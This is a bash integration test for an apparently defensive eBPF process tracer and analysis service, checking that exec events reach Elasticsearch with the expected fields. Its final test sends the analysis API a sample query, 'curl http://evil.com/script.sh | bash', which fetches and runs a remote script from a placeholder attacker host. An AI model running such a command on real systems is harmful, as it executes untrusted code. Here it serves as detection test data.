#!/bin/bash
set -e

ANALYSIS_URL="${ANALYSIS_URL:-http://localhost:8080}"
ES_URL="${ES_URL:-http://localhost:9200}"
INDEX_NAME="${INDEX_NAME:-kb-events}"
TRACER_PATH="${TRACER_PATH:-./execve-tracer}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

pass() { echo -e "${GREEN}✓ PASS${NC}: $1"; }
fail() { echo -e "${RED}✗ FAIL${NC}: $1"; exit 1; }
warn() { echo -e "${YELLOW}⚠ WARN${NC}: $1"; }
info() { echo -e "ℹ $1"; }

check_root() {
    if [ "$EUID" -ne 0 ]; then
        warn "Not running as root - tracer tests will be skipped"
        return 1
    fi
    return 0
}

check_tracer_binary() {
    if [ ! -f "$TRACER_PATH" ]; then
        warn "Tracer binary not found at $TRACER_PATH"
        return 1
    fi
    return 0
}

check_service() {
    local url=$1
    local name=$2
    if curl -s -f "$url" > /dev/null 2>&1; then
        pass "$name is running"
        return 0
    else
        fail "$name is not running at $url"
    fi
}

get_event_count() {
    curl -s "$ES_URL/$INDEX_NAME/_count" | grep -o '"value"[[:space:]]*:[[:space:]]*[0-9]*' | grep -o '[0-9]*'
}

echo "=========================================="
echo "KernelHarbor Integration Test Suite"
echo "=========================================="
echo ""

info "Checking prerequisites..."

check_service "$ANALYSIS_URL/health" "Analysis API"
check_service "$ES_URL" "Elasticsearch"

echo ""
info "Getting initial event count..."
INITIAL_COUNT=$(get_event_count)
echo "Initial events in ES: $INITIAL_COUNT"

echo ""
echo "=========================================="
echo "Testing eBPF Tracer"
echo "=========================================="

if ! check_root; then
    warn "Skipping tracer tests - requires root"
    exit 0
fi

if ! check_tracer_binary; then
    warn "Building tracer..."
    (cd cmd/execve-tracer && go build -o execve-tracer .) || fail "Failed to build tracer"
fi

echo ""
info "Starting tracer in background..."
$TRACER_PATH &
TRACER_PID=$!
sleep 2

if ! kill -0 $TRACER_PID 2>/dev/null; then
    fail "Tracer failed to start"
fi

pass "Tracer started (PID: $TRACER_PID)"

echo ""
info "Triggering test commands..."

echo "trigger" > /tmp/test_trigger_$$ 2>/dev/null || true
ls /tmp/test_trigger_$$ 2>/dev/null || true
cat /etc/hostname > /dev/null 2>/dev/null || true

sleep 3

echo ""
info "Stopping tracer..."
kill $TRACER_PID 2>/dev/null || true
wait $TRACER_PID 2>/dev/null || true
pass "Tracer stopped"

echo ""
info "Checking for new events in Elasticsearch..."
sleep 2
FINAL_COUNT=$(get_event_count)
NEW_EVENTS=$((FINAL_COUNT - INITIAL_COUNT))

echo "Events before: $INITIAL_COUNT"
echo "Events after:  $FINAL_COUNT"
echo "New events:    $NEW_EVENTS"

if [ "$NEW_EVENTS" -gt 0 ]; then
    pass "Tracer captured $NEW_EVENTS new events"
else
    warn "No new events captured (may be normal if tracer needs more time)"
fi

echo ""
echo "--- Verifying event structure ---"
EVENT_DOC=$(curl -s "$ES_URL/$INDEX_NAME/_search?size=1&sort=@timestamp:desc" | jq -r '.hits.hits[0]._source // empty')

if [ -n "$EVENT_DOC" ] && [ "$EVENT_DOC" != "null" ]; then
    pass "Event document retrieved from ES"
    
    EVENT_TYPE=$(echo "$EVENT_DOC" | jq -r '.["event.type"] // empty')
    if [ -n "$EVENT_TYPE" ]; then
        pass "Event has type: $EVENT_TYPE"
    else
        warn "Event missing event.type field"
    fi
    
    PROCESS_PID=$(echo "$EVENT_DOC" | jq -r '.["process.pid"] // empty')
    if [ -n "$PROCESS_PID" ]; then
        pass "Event has process.pid: $PROCESS_PID"
    else
        warn "Event missing process.pid field"
    fi
    
    IMAGE_PATH=$(echo "$EVENT_DOC" | jq -r '.["image.path"] // empty')
    if [ -n "$IMAGE_PATH" ]; then
        pass "Event has image.path: $IMAGE_PATH"
    else
        warn "Event missing image.path field"
    fi
else
    warn "No event document found"
fi

echo ""
echo "--- Testing behavior summarization ---"
curl -s -X POST "$ANALYSIS_URL/analyze" \
    -H "Content-Type: application/json" \
    -d '{"host.name":"test","query":"curl http://evil.com/script.sh | bash"}' | jq -r '.verdict' || true

echo ""
echo "=========================================="
pass "Integration tests completed!"
echo "=========================================="
echo ""
info "Summary:"
echo "  - Tracer binary: $TRACER_PATH"
echo "  - Events captured: $NEW_EVENTS"
echo "  - Analysis pipeline: working"
echo ""
